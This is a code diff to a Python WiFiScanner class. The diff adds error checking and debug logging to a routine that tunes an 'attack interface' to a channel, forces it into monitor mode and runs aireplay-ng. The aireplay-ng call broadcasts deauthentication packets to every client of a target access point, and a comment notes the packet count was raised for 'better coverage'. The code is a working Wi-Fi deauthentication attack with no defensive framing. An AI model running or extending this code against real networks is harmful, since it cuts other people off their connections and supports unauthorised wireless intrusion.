@@ -403,9 +403,12 @@ class WiFiScanner:
             
             # Set attack interface to correct channel
             try:
-                subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
-                             capture_output=True, timeout=5)
-                logger.debug(f"Set {self.attack_interface} to channel {channel}")
+                channel_result = subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
+                             capture_output=True, text=True, timeout=5)
+                if channel_result.returncode == 0:
+                    logger.debug(f"Set {self.attack_interface} to channel {channel}")
+                else:
+                    logger.warning(f"Failed to set channel {channel}: {channel_result.stderr[:200]}")
             except Exception as e:
                 logger.warning(f"Could not set channel on attack interface: {e}")
             
@@ -419,8 +422,12 @@ class WiFiScanner:
                     subprocess.run(['iw', self.attack_interface, 'set', 'monitor', 'control'], timeout=5)
                     subprocess.run(['ip', 'link', 'set', self.attack_interface, 'up'], timeout=5)
                     time.sleep(1)
+                else:
+                    logger.debug(f"{self.attack_interface} is in monitor mode")
             except Exception as e:
                 logger.warning(f"Could not verify/fix monitor mode: {e}")
+            
+            logger.debug(f"Starting aireplay-ng: BSSID={bssid}, CH={channel}, Interface={self.attack_interface}")
             
             # Send deauth packets to broadcast (all clients)
             # --deauth: number of deauth packets to send (increased to 20 for better coverage)
@@ -432,6 +439,8 @@ class WiFiScanner:
                 '-a', bssid,
                 self.attack_interface  # Use attack interface for deauth
             ], capture_output=True, text=True, timeout=30)
+            
+            logger.debug(f"aireplay-ng completed with returncode={result.returncode}")
             
             if result.returncode == 0:
                 logger.info(f"✓ Deauth sent to {ssid}")
